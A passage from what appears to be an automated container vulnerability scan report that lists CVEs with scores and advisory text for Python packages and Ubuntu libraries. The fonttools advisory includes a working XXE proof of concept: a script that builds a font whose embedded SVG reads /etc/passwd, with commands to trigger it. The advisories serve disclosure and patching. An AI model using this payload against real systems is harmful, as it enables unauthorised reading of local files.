<details><summary>Description</summary>
<blockquote>

A flaw was found in python-pip in the way it handled Unicode separators in git references. A remote attacker could possibly use this issue to install a different revision on a repository. The highest threat from this vulnerability is to data integrity. This is fixed in python-pip version 21.1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-5752?s=github&n=pip&t=pypi&vr=%3C23.3"><img alt="medium 6.8: CVE--2023--5752" src="https://img.shields.io/badge/CVE--2023--5752-lightgrey?label=medium%206.8&labelColor=fbb552"/></a> <i>Improper Neutralization of Special Elements used in a Command ('Command Injection')</i>

<table>
<tr><td>Affected range</td><td><code><23.3</code></td></tr>
<tr><td>Fixed version</td><td><code>23.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When installing a package from a Mercurial VCS URL, e.g. `pip install hg+...`, with pip prior to v23.3, the specified Mercurial revision could be used to inject arbitrary configuration options to the `hg clone` call (e.g. `--config`). Controlling the Mercurial configuration can modify how and which repository is installed. This vulnerability does not affect users who aren't installing from Mercurial.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>67.6.0</code> (pypi)</summary>

<small><code>pkg:pypi/setuptools@67.6.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1"><img alt="high 7.7: CVE--2025--47273" src="https://img.shields.io/badge/CVE--2025--47273-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><78.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>78.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.120%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary 
A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1

### Details
```
    def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.[egg.zip](http://egg.zip/)'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```

Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88

`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.
`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.

### Risk Assessment
As easy_install and package_index are deprecated, the exploitation surface is reduced.
However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.

### Impact
An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.

### References
https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5
https://github.com/pypa/setuptools/issues/4946

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-6345?s=github&n=setuptools&t=pypi&vr=%3C70.0.0"><img alt="high 7.5: CVE--2024--6345" src="https://img.shields.io/badge/CVE--2024--6345-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Control of Generation of Code ('Code Injection')</i>

<table>
<tr><td>Affected range</td><td><code><70.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>70.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.227%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>pyopenssl</strong> <code>17.0.0</code> (pypi)</summary>

<small><code>pkg:pypi/pyopenssl@17.0.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2018-1000808?s=github&n=pyopenssl&t=pypi&vr=%3C17.5.0"><img alt="high 8.2: CVE--2018--1000808" src="https://img.shields.io/badge/CVE--2018--1000808-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Missing Release of Memory after Effective Lifetime</i>

<table>
<tr><td>Affected range</td><td><code><17.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>17.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.280%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was discovered that pyOpenSSL incorrectly handled memory when performing operations on a PKCS #12 store. A remote attacker could possibly use this issue to cause pyOpenSSL to consume resources, resulting in a denial of service.

This attack appear to be exploitable via Depends upon calling application, however it could be as simple as initiating a TLS connection that would cause the calling application to reload certificates from a PKCS #12 store. This vulnerability appears to have been fixed in 17.5.0.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-1000807?s=github&n=pyopenssl&t=pypi&vr=%3C17.5.0"><img alt="high 8.1: CVE--2018--1000807" src="https://img.shields.io/badge/CVE--2018--1000807-lightgrey?label=high%208.1&labelColor=e25d68"/></a> <i>Use After Free</i>

<table>
<tr><td>Affected range</td><td><code><17.5.0</code></td></tr>
<tr><td>Fixed version</td><td><code>17.5.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.889%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was discovered that pyOpenSSL incorrectly handled memory when handling X509 objects. A remote attacker could use this issue to cause pyOpenSSL to crash, resulting in a denial of service, or possibly execute arbitrary code. This attack appears to be exploitable via Depends on the calling application and if it retains a reference to the memory. This vulnerability appears to have been fixed in 17.5.0.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>requests</strong> <code>2.14.2</code> (pypi)</summary>

<small><code>pkg:pypi/requests@2.14.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2018-18074?s=github&n=requests&t=pypi&vr=%3C%3D2.19.1"><img alt="high 7.5: CVE--2018--18074" src="https://img.shields.io/badge/CVE--2018--18074-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Insufficiently Protected Credentials</i>

<table>
<tr><td>Affected range</td><td><code><=2.19.1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.20.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.219%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Requests package through 2.19.1 before 2018-09-14 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-32681?s=github&n=requests&t=pypi&vr=%3E%3D2.3.0%2C%3C2.31.0"><img alt="medium 6.1: CVE--2023--32681" src="https://img.shields.io/badge/CVE--2023--32681-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=2.3.0<br/><2.31.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.31.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>6.121%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Since Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).

**Current vulnerable behavior(s):**

1. HTTP → HTTPS: **leak**
2. HTTPS → HTTP: **no leak**
3. HTTPS → HTTPS: **leak**
4. HTTP → HTTP: **no leak**

For HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.

The reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.

### Patches
Starting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.

For users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.

### Workarounds
For users who are not able to update Requests immediately, there is one potential workaround.

You may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.
```
import requests
r = requests.get('http://github.com/', allow_redirects=False)
```

### Credits

This vulnerability was discovered and disclosed by the following individuals.

Dennis Brinkrolf, Haxolot (https://haxolot.com/)
Tobias Funke, (tobiasfunke93@gmail.com)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-35195?s=github&n=requests&t=pypi&vr=%3C2.32.0"><img alt="medium 5.6: CVE--2024--35195" src="https://img.shields.io/badge/CVE--2024--35195-lightgrey?label=medium%205.6&labelColor=fbb552"/></a> <i>Always-Incorrect Control Flow Implementation</i>

<table>
<tr><td>Affected range</td><td><code><2.32.0</code></td></tr>
<tr><td>Fixed version</td><td><code>2.32.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When making requests through a Requests `Session`, if the first request is made with `verify=False` to disable cert verification, all subsequent requests to the same origin will continue to ignore cert verification regardless of changes to the value of `verify`. This behavior will continue for the lifecycle of the connection in the connection pool.

### Remediation
Any of these options can be used to remediate the current issue, we highly recommend upgrading as the preferred mitigation.

* Upgrade to `requests>=2.32.0`.
* For `requests<2.32.0`, avoid setting `verify=False` for the first request to a host while using a Requests Session.
* For `requests<2.32.0`, call `close()` on `Session` objects to clear existing connections if `verify=False` is used.

### Related Links
* https://github.com/psf/requests/pull/6655

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-47081?s=github&n=requests&t=pypi&vr=%3C2.32.4"><img alt="medium 5.3: CVE--2024--47081" src="https://img.shields.io/badge/CVE--2024--47081-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Insufficiently Protected Credentials</i>

<table>
<tr><td>Affected range</td><td><code><2.32.4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.32.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.062%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.

### Workarounds
For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).

### References
https://github.com/psf/requests/pull/6965
https://seclists.org/fulldisclosure/2025/Jun/2

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>fonttools</strong> <code>4.39.0</code> (pypi)</summary>

<small><code>pkg:pypi/fonttools@4.39.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-45139?s=github&n=fonttools&t=pypi&vr=%3E%3D4.28.2%2C%3C4.43.0"><img alt="high 7.5: CVE--2023--45139" src="https://img.shields.io/badge/CVE--2023--45139-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Improper Restriction of XML External Entity Reference</i>

<table>
<tr><td>Affected range</td><td><code>>=4.28.2<br/><4.43.0</code></td></tr>
<tr><td>Fixed version</td><td><code>4.43.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

As of `fonttools>=4.28.2` the subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed. 

This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system. 

### PoC


The vulnerability can be reproduced following the bellow steps on a unix based system.

1. Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised `/etc/passwd` for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.

```python

from string import ascii_letters
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
from fontTools.ttLib import newTable


XXE_SVG = """\
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <g id="glyph1">
    <text font-size="10" x="0" y="10">&test;</text>
  </g>
</svg>
"""

def main():
    # generate a random TTF font with an SVG table
    glyph_order = [".notdef"] + list(ascii_letters)
    pen = TTGlyphPen(glyphSet=None)
    pen.moveTo((0, 0))
    pen.lineTo((0, 500))
    pen.lineTo((500, 500))
    pen.lineTo((500, 0))
    pen.closePath()
    glyph = pen.glyph()
    glyphs = {g: glyph for g in glyph_order}

    fb = FontBuilder(unitsPerEm=1024, isTTF=True)
    fb.setupGlyphOrder(glyph_order)
    fb.setupCharacterMap({ord(c): c for c in ascii_letters})
    fb.setupGlyf(glyphs)
    fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})
    fb.setupHorizontalHeader()
    fb.setupOS2()
    fb.setupPost()
    fb.setupNameTable({"familyName": "TestSVG", "styleName": "Regular"})

    svg_table = newTable("SVG ")
    svg_table.docList = [
       (XXE_SVG, 1, 12)
    ]
    fb.font["SVG "] = svg_table

    fb.font.save('poc-payload.ttf')

if __name__ == '__main__':
    main()

```

2. Subset the font with an affected version of fontTools - we tested on `fonttools==4.42.1` and `fonttools==4.28.2` - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):

```shell
pyftsubset poc-payload.ttf --output-file="poc-payload.subset.ttf" --unicodes="*" --ignore-missing-glyphs
```

3. Read the parsed SVG table in the subsetted font:

```shell
ttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx
```

Observed the included contents of the `/etc/passwd` file. 

### Impact

Note the final severity is dependant on the environment fontTools is running in.

- The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on



### Possible Mitigations 

There may be other ways to mitigate the issue, but some suggestions:

1. Set the `resolve_entities=False` flag on parsing methods
2. Consider further methods of disallowing doctype declarations
3. Consider recursive regex matching



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wheel</strong> <code>0.29.0</code> (pypi)</summary>

<small><code>pkg:pypi/wheel@0.29.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-40898?s=github&n=wheel&t=pypi&vr=%3C0.38.1"><img alt="high 7.5: CVE--2022--40898" src="https://img.shields.io/badge/CVE--2022--40898-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Inefficient Regular Expression Complexity</i>

<table>
<tr><td>Affected range</td><td><code><0.38.1</code></td></tr>
<tr><td>Fixed version</td><td><code>0.38.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.196%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Python Packaging Authority (PyPA) Wheel is a reference implementation of the Python wheel packaging standard. Wheel 0.37.1 and earlier are vulnerable to a Regular Expression denial of service via attacker controlled input to the wheel cli. The vulnerable regex is used to verify the validity of Wheel file names. This has been patched in version 0.38.1.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>krb5</strong> <code>1.19.2-2ubuntu0.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/krb5@1.19.2-2ubuntu0.4?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-3596?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.19.2-2ubuntu0.5"><img alt="medium 9.0: CVE--2024--3596" src="https://img.shields.io/badge/CVE--2024--3596-lightgrey?label=medium%209.0&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.19.2-2ubuntu0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>1.19.2-2ubuntu0.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

RADIUS Protocol under RFC 2865 is susceptible to forgery attacks by a local attacker who can modify any valid Response (Access-Accept, Access-Reject, or Access-Challenge) to any other response using a chosen-prefix collision attack against MD5 Response Authenticator signature.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3576?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.19.2-2ubuntu0.7"><img alt="medium : CVE--2025--3576" src="https://img.shields.io/badge/CVE--2025--3576-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.19.2-2ubuntu0.7</code></td></tr>
<tr><td>Fixed version</td><td><code>1.19.2-2ubuntu0.7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-24528?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.19.2-2ubuntu0.6"><img alt="medium : CVE--2025--24528" src="https://img.shields.io/badge/CVE--2025--24528-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.19.2-2ubuntu0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.19.2-2ubuntu0.6</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In MIT krb5 release 1.7 and later with incremental propagation enabled, an authenticated attacker can cause kadmind to write beyond the end of the mapped region for the iprop log file, likely causing a process crash.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26461?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.19.2-2ubuntu0.6"><img alt="low : CVE--2024--26461" src="https://img.shields.io/badge/CVE--2024--26461-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.19.2-2ubuntu0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.19.2-2ubuntu0.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak vulnerability in /krb5/src/lib/gssapi/krb5/k5sealv3.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-26458?s=ubuntu&n=krb5&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C1.19.2-2ubuntu0.6"><img alt="low : CVE--2024--26458" src="https://img.shields.io/badge/CVE--2024--26458-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.19.2-2ubuntu0.6</code></td></tr>
<tr><td>Fixed version</td><td><code>1.19.2-2ubuntu0.6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.152%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>37th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Kerberos 5 (aka krb5) 1.21.2 contains a memory leak in /krb5/src/lib/rpc/pmap_rmt.c.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>glibc</strong> <code>2.35-0ubuntu3.8</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/glibc@2.35-0ubuntu3.8?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-4802?s=ubuntu&n=glibc&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C2.35-0ubuntu3.10"><img alt="medium : CVE--2025--4802" src="https://img.shields.io/badge/CVE--2025--4802-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.35-0ubuntu3.10</code></td></tr>
<tr><td>Fixed version</td><td><code>2.35-0ubuntu3.10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0395?s=ubuntu&n=glibc&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C2.35-0ubuntu3.9"><img alt="medium : CVE--2025--0395" src="https://img.shields.io/badge/CVE--2025--0395-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.35-0ubuntu3.9</code></td></tr>
<tr><td>Fixed version</td><td><code>2.35-0ubuntu3.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.219%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>45th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>python3.10</strong> <code>3.10.12-1~22.04.7</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/python3.10@3.10.12-1~22.04.7?os_distro=jammy&os_name=ubuntu&os_version=22.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-0938?s=ubuntu&n=python3.10&ns=ubuntu&t=deb&osn=ubuntu&osv=22.04&vr=%3C3.10.12-1%7E22.04.9"><img alt="medium : CVE--2025--0938" src="https://img.shields.io/badge/CVE--2025--0938-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.10.12-1~22.04.9</code></td></tr>
<tr><td>Fixed version</td><td><code>3.10.12-1~22.04.9</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>76th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

